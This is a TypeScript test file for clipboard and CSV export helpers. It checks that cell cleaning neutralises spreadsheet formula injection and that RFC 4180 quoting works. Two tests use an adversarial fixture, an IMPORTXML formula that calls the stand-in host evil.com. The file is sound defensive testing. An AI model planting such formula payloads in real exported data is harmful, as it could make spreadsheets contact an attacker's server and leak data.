import { describe, expect, it } from "vitest";
import { cleanCell, rowsToTsv, tsvToCsv } from "./clipboard";

// ---------------------------------------------------------------------------
// cleanCell
// ---------------------------------------------------------------------------
describe("cleanCell", () => {
  it("returns an empty string for null / undefined", () => {
    expect(cleanCell(null)).toBe("");
    expect(cleanCell(undefined)).toBe("");
  });

  it("passes through a plain string unchanged", () => {
    expect(cleanCell("hello world")).toBe("hello world");
  });

  it("stringifies numbers", () => {
    expect(cleanCell(42)).toBe("42");
    expect(cleanCell(0)).toBe("0");
  });

  it("collapses internal tabs and newlines to a space", () => {
    expect(cleanCell("line1\nline2")).toBe("line1 line2");
    expect(cleanCell("a\tb")).toBe("a b");
    expect(cleanCell("a\r\nb")).toBe("a b");
  });

  it("trims leading/trailing whitespace", () => {
    expect(cleanCell("  hello  ")).toBe("hello");
  });

  // Formula-injection neutralisation
  it("prefixes = with a single quote", () => {
    expect(cleanCell("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
  });

  it("prefixes + with a single quote", () => {
    expect(cleanCell("+1234")).toBe("'+1234");
  });

  it("prefixes - with a single quote", () => {
    expect(cleanCell("-DROP TABLE")).toBe("'-DROP TABLE");
  });

  it("prefixes @ with a single quote", () => {
    expect(cleanCell("@SUM")).toBe("'@SUM");
  });

  // Double-quotes in the value are NOT touched by cleanCell; quoting is the
  // responsibility of the CSV layer.
  it("leaves double-quotes untouched", () => {
    expect(cleanCell(`He said "hi"`)).toBe(`He said "hi"`);
  });

  // Commas are also left alone; CSV quoting handles them.
  it("leaves commas untouched", () => {
    expect(cleanCell("a, b, c")).toBe("a, b, c");
  });
});

// ---------------------------------------------------------------------------
// rowsToTsv  (cleanCell is applied to every cell)
// ---------------------------------------------------------------------------
describe("rowsToTsv", () => {
  it("emits a header row followed by data rows, tab-separated", () => {
    const tsv = rowsToTsv(["A", "B"], [["x", "y"]]);
    expect(tsv).toBe("A\tB\nx\ty");
  });

  it("neutralises formula injection in cell values", () => {
    const tsv = rowsToTsv(["Title"], [["=FORMULA()"]]);
    // cleanCell should have prepended a '
    expect(tsv).toBe("Title\n'=FORMULA()");
  });

  it("does not break when a cell contains a tab (replaced by space)", () => {
    const tsv = rowsToTsv(["T"], [["col1\tcol2"]]);
    // The tab inside the value becomes a space so it cannot split columns
    expect(tsv).toBe("T\ncol1 col2");
    expect(tsv.split("\n")[1]!.split("\t")).toHaveLength(1);
  });

  it("handles a title that contains a double-quote", () => {
    const tsv = rowsToTsv(["Topic"], [[`He said "hi"`]]);
    // The quote is preserved verbatim in TSV (TSV does not require quoting)
    expect(tsv).toBe(`Topic\nHe said "hi"`);
  });

  it("handles a title that contains a comma", () => {
    const tsv = rowsToTsv(["Topic"], [["cats, dogs, and fish"]]);
    expect(tsv).toBe("Topic\ncats, dogs, and fish");
  });

  // Adversarial round-trip: comma + quote + formula injection together
  it("handles a cell with comma, quote, and formula prefix combined", () => {
    const adversarial = `=IMPORTXML("http://evil.com","//a")`;
    const tsv = rowsToTsv(["Topic"], [[adversarial]]);
    const cell = tsv.split("\n")[1]!;
    // Formula is neutralised
    expect(cell.startsWith("'")).toBe(true);
    // The tab delimiter is not polluted (single column in this row)
    expect(cell.split("\t")).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// tsvToCsv  (RFC 4180 quoting layer applied on top of TSV)
// ---------------------------------------------------------------------------
describe("tsvToCsv", () => {
  it("converts tabs to commas for plain cells", () => {
    expect(tsvToCsv("A\tB\nfoo\tbar")).toBe("A,B\nfoo,bar");
  });

  it("wraps a cell containing a comma in double quotes", () => {
    const csv = tsvToCsv("Title\ncats, dogs");
    expect(csv).toBe('Title\n"cats, dogs"');
  });

  it("wraps a cell containing a double-quote and escapes it", () => {
    const csv = tsvToCsv(`Title\nHe said "hi"`);
    expect(csv).toBe(`Title\n"He said ""hi"""`);
  });

  it("wraps a cell containing both a comma and a double-quote", () => {
    const csv = tsvToCsv(`Topic\n"Hello, World"`);
    // The raw value is: "Hello, World"  (has both " and ,)
    expect(csv).toBe(`Topic\n"""Hello, World"""`);
  });

  it("leaves formula-neutralised cells intact (no extra quoting needed)", () => {
    // cleanCell turns =FORMULA() into '=FORMULA() — the single-quote prefix
    // means neither comma nor double-quote is present, so no CSV quoting.
    const csv = tsvToCsv("Topic\n'=FORMULA()");
    expect(csv).toBe("Topic\n'=FORMULA()");
  });

  it("handles multi-column rows correctly", () => {
    // Simulates a real export row: title with comma, plain level, formula query
    const tsv = rowsToTsv(
      ["Topic", "Level", "Canonical Query"],
      [['Cats, Dogs & Fish', "core topic", "=IMPORTDATA()"]],
    );
    const csv = tsvToCsv(tsv);
    const lines = csv.split("\n");
    expect(lines[0]).toBe("Topic,Level,Canonical Query");
    // Title has a comma → must be quoted
    expect(lines[1]!.startsWith('"Cats, Dogs & Fish"')).toBe(true);
    // Level has no special chars → unquoted
    expect(lines[1]!).toContain(",core topic,");
    // Canonical query was formula-injected → neutralised with '
    expect(lines[1]!.endsWith("'=IMPORTDATA()")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Full round-trip: rowsToTsv → tsvToCsv → parse as CSV
// Verify the adversarial title survives the round-trip with the correct value.
// ---------------------------------------------------------------------------
describe("CSV round-trip with adversarial topic title", () => {
  /**
   * Minimal RFC 4180 CSV parser to validate the exported output.
   * Returns a 2-D array of cell strings.
   */
  function parseCsv(csv: string): string[][] {
    const rows: string[][] = [];
    let row: string[] = [];
    let cell = "";
    let inQuote = false;
    for (let i = 0; i < csv.length; i++) {
      const ch = csv[i]!;
      if (inQuote) {
        if (ch === '"') {
          if (csv[i + 1] === '"') {
            cell += '"';
            i++;
          } else {
            inQuote = false;
          }
        } else {
          cell += ch;
        }
      } else if (ch === '"') {
        inQuote = true;
      } else if (ch === ",") {
        row.push(cell);
        cell = "";
      } else if (ch === "\n") {
        row.push(cell);
        cell = "";
        rows.push(row);
        row = [];
      } else {
        cell += ch;
      }
    }
    row.push(cell);
    if (row.some((c) => c !== "")) rows.push(row);
    return rows;
  }

  it("round-trips a title with comma, double-quote, and =FORMULA()", () => {
    const adversarialTitle = `=IMPORTXML("http://evil.com","//a"), and more`;
    const rows: Cell[][] = [
      [adversarialTitle, "pillar", "gap", "high", "top", "some query", null, null, 0, "evil.com"],
    ];
    const tsv = rowsToTsv(
      ["Topic", "Level", "Status", "Priority", "Funnel", "Canonical Query", "Matched Page", "GSC Clicks", "Extra", "Competitor Domains"],
      rows,
    );
    const csv = tsvToCsv(tsv);
    const parsed = parseCsv(csv);

    // Header row
    expect(parsed[0]![0]).toBe("Topic");

    // Data row — the cell value after round-trip should be the neutralised
    // version: the leading = is replaced by ' so it is NOT a formula.
    const titleCell = parsed[1]![0]!;
    expect(titleCell.startsWith("'")).toBe(true);       // injection neutralised
    expect(titleCell).not.toMatch(/^=/);                // never starts with =
    // The rest of the content (after the ') must survive intact.
    expect(titleCell).toContain("evil.com");
    expect(titleCell).toContain("and more");
  });

  it("round-trips a title that is only a comma-separated list", () => {
    const title = "cats, dogs, fish";
    const tsv = rowsToTsv(["Topic", "Level"], [[title, "core topic"]]);
    const csv = tsvToCsv(tsv);
    const parsed = parseCsv(csv);
    expect(parsed[1]![0]).toBe("cats, dogs, fish");
    expect(parsed[1]![1]).toBe("core topic");
  });

  it("round-trips a title that is only a quoted string", () => {
    const title = `He said "hello world"`;
    const tsv = rowsToTsv(["Topic", "Level"], [[title, "supporting"]]);
    const csv = tsvToCsv(tsv);
    const parsed = parseCsv(csv);
    expect(parsed[1]![0]).toBe(`He said "hello world"`);
  });

  it("round-trips competitor domains that contain commas", () => {
    // buildExportRows joins domains with ", " — this cell always has commas
    const domains = "evil.com, bad.org, malicious.net";
    const tsv = rowsToTsv(["Topic", "Competitor Domains"], [["Normal Title", domains]]);
    const csv = tsvToCsv(tsv);
    const parsed = parseCsv(csv);
    expect(parsed[1]![1]).toBe("evil.com, bad.org, malicious.net");
  });
});

// Re-export Cell type used in the round-trip test above so TypeScript is happy.
import type { Cell } from "./clipboard";
